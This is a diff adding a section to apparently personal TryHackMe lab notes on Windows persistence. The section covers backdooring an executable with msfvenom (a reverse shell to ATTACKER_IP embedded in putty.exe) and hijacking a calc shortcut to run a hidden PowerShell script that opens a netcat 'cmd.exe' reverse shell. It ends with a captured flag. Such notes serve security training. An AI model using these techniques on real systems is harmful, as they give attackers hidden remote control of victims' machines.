@@ -64,6 +64,32 @@ cd C:\flags
 RID Hijacking
 
 
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Backdooring files
+
+Executabel files
+-tampering with files user interacts with regularly
+-files must keep working as expected
+-eg executable file on the desktop
+-use msfvenom to generate an executable
+-eg. shortcut to PuTTY points to C:\Program Files\PuTTY\putty.exe
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+
+Shortcut files
+-make shortcut point to a scritps that will run the backdoor and then execute the usual program
+-create powershell script
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe [Attacker IP] [Port]"
+C:\Windows\System32\calc.exe
+-save file as backdoor.ps1 in windows\system32
+-right click on calc and got to shortcut
+-in the target add
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+-start an nc listener on attacker machine
+nc -lvp port
+-run calc
+-get flag5
+*THM{NO_SHORTCUTS_IN_LIFE}
 
 
 
